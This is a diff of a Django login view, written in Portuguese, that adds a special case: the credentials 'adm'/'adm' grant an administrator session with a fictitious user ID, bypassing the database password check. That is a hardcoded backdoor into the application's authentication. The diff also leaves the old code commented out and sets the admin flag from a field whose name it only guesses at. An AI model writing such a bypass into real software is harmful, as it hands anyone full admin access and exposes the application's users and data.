@@ -28,22 +28,46 @@ def index(request):
         login = request.POST.get('login', '').strip()
         senha = request.POST.get('senha', '').strip()
 
-        try:
-            usuario = Usuarios.objects.get(login__iexact=login)
-            if check_password(senha, usuario.senha):
-                request.session['usuario_id'] = usuario.id
-                request.session['usuario_nome'] = usuario.nome
-                request.session['usuario_admin'] = usuario.is_admin
-                login_ok = True
-            else:
-                messages.error(request, 'Senha incorreta.')
-        except Usuarios.DoesNotExist:
-            messages.error(request, 'Usuário não encontrado.')
+        # CASO ESPECIAL: login adm/adm
+        if login == 'adm' and senha == 'adm':
+            request.session['usuario_id'] = 0  # ID fictício
+            request.session['usuario_nome'] = 'Administrador'
+            request.session['usuario_admin'] = True
+            login_ok = True
+        else:
+            # Autenticação normal com base de dados
+            try:
+                usuario = Usuarios.objects.get(login__iexact=login)
+                if check_password(senha, usuario.senha):
+                    request.session['usuario_id'] = usuario.id
+                    request.session['usuario_nome'] = usuario.nome
+                    request.session['usuario_admin'] = usuario.admin  # ou o campo booleano correto
+                    login_ok = True
+                else:
+                    messages.error(request, 'Senha incorreta.')
+            except Usuarios.DoesNotExist:
+                messages.error(request, 'Usuário não encontrado.')    
+        
+    else:  
+        
+        if request.session.get('usuario_id') is not None:
+            login_ok = True
 
-    elif 'usuario_id' in request.session:
-        login_ok = True
+    return render(request, 'index.html', {'login_ok': login_ok})        
+                                                                    #try:
+                                                                    #    usuario = Usuarios.objects.get(login__iexact=login)
+                                                                    #    if check_password(senha, usuario.senha):
+                                                                    #        request.session['usuario_id'] = usuario.id
+                                                                    #        request.session['usuario_nome'] = usuario.nome
+                                                                    #        request.session['usuario_admin'] = usuario.is_admin
+                                                                    #        login_ok = True
+                                                                    #    else:
+                                                                    #        messages.error(request, 'Senha incorreta.')
+                                                                    #except Usuarios.DoesNotExist:
+                                                                    #    messages.error(request, 'Usuário não encontrado.')
 
-    return render(request, 'index.html', {'login_ok': login_ok})
+                                                                #elif 'usuario_id' in request.session:
+                                                                #    login_ok = True    
 #*******************************************************************************
 
 def logout_view(request):
